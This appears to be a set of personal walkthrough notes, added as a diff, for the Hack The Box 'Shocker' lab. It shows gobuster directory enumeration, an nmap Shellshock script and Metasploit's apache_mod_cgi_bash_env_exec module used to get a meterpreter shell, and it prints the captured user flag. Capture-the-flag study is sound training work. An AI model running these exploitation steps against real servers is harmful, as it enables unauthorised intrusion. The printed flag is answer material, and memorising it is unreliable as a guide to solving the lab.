@@ -1,0 +1,61 @@
+#####################
+# Sources and Links #
+#####################
+https://www.youtube.com/watch?v=IBlTdguhgfY
+
+#########
+# TL,DR #
+#########
+
+########
+# Hack #
+########
+Port 80 and 2222 is up.
+Gobuster doesn't show anything!
+We can tell Gobuster to also show us 403 messages: pages that exist, but that we don't have access to.
+-s to set status codes
+gobuster dir -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster_shocker.txt -s 403
+
+We found /cgi-bin/, but access is not allowed. We can Gobuster that dir, 
+searching for specific file extensions
+gobuster dir -u 10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_cgi-bin.txt -x sh,pl
+
+Found user.sh
+We can see how this script executes with Burp!
+Burp > Proxy > Options > Intercept server request
+
+HTTP/1.1 200 OK
+Date: Sun, 24 Nov 2019 21:38:45 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Connection: close
+Content-Type: text/x-sh
+Content-Length: 119
+
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 16:38:45 up 12 min,  0 users,  load average: 0.00, 0.10, 0.17
+
+We can manipulat text/x-sh to text/plain, and plain text will be rendered.
+
+An nmap scan does not show shellshock vulns
+nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56 
+
+But metasploit can spawn a shell for us!
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.10.10.56
+RHOSTS => 10.10.10.56
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/user.sh
+
+meterpreter > cat user.txt 
+2ec24e11320026d1e70ff3e16695b233
+
+###########
+# Learned #
+###########
+gobuster -s 403
+sets status codes to accept 403 search
+Still couldn't find cgi-bin unless a '/' was appended >:(
+
+https://stackoverflow.com/questions/11303032/how-to-add-text-at-the-end-of-each-line-in-vim#11310113
+:%s/$/\//
